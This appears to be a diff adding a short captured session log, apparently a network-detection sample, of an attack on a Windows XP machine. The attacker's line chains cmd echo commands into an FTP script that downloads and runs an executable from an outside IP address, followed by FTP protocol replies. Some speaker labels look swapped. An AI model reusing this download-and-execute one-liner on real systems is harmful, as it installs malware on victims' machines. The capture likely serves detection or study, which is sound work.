@@ -1,0 +1,16 @@
+VICTIM:  	Microsoft Windows XP [Version 5.1.2600] 
+VICTIM:  	(C) Copyright 1985-2001 Microsoft Corp.C:\\WINDOWS\\system32> 
+ATTACKER:	echo off&echo open 1.114.181.142 1023>>cmd.ftp&echo anonymous>>cmd.ftp&echo user&echo bin>>cmd.ftp&echo get 6023_upload.exe>>cmd.ftp&echo bye>>cmd.ftp&echo on&ftp -s:cmd.ftp&6023_upload.exe&echo off&del cmd.ftp&echo onuser 
+ATTACKER:	220 OK 
+VICTIM:  	USER anonymous 
+VICTIM:  	User (1.114.181.142:(none)): open 1.114.181.142 1023 
+ATTACKER:	331 OK 
+VICTIM:  	PASS bin 
+ATTACKER:	230 OK 
+VICTIM:  	PORT 192,168,1,139,4 
+ATTACKER:	200 OK 
+ATTACKER:	RETR 6023_upload.exe 
+ATTACKER:	150 OK 
+ATTACKER:	226 OK 
+VICTIM:  	QUIT 
+
